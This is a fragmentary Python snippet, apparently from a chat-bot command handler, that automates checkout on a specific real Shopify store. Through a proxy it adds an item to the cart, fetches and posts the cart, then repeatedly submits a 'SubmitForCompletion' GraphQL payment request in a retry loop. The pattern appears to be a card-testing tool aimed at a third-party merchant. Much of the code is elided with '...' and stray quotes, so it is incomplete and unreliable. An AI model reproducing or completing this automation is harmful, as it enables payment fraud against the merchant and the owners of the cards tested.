...
async def sh(message):
    ...
    async with aiohttp.ClientSession() as r:
        url = "https://bill-harley.myshopify.com/cart/add.js"
        headers = {
...
"""
        ...
        async with r.get('https://bill-harley.myshopify.com/cart.js', headers=headers, proxy=PROX) as response:
...
"""
        ...
        response = await r.post(
            'https://bill-harley.myshopify.com/cart',
            headers=headers,
            data=data,
        ...
        json_data = {
            ...
            'payment_session_scope': 'bill-harley.myshopify.com',
        }
...
"""
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/43580747808938',
                                        'variantId': 'gid://shopify/ProductVariant/43580747808938',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://bill-harley.myshopify.com/checkouts/cn/{tok}',
                    'pageId': '57700f7a-0228-4137-DD89-5F2EE88966AC',
                },
            },
            'operationName': 'SubmitForCompletion',
        }

        async with r.post('https://bill-harley.myshopify.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, proxy=PROX) as response:
            raw = await response.text()
            try:
                res_json = json.loads(raw)
...
"""
            ...
            for _ in range(max_retries):
                async with r.post('https://bill-harley.myshopify.com/checkouts/unstable/graphql',params=params,headers=headers,json=json_data, proxy=PROX) as final_response:
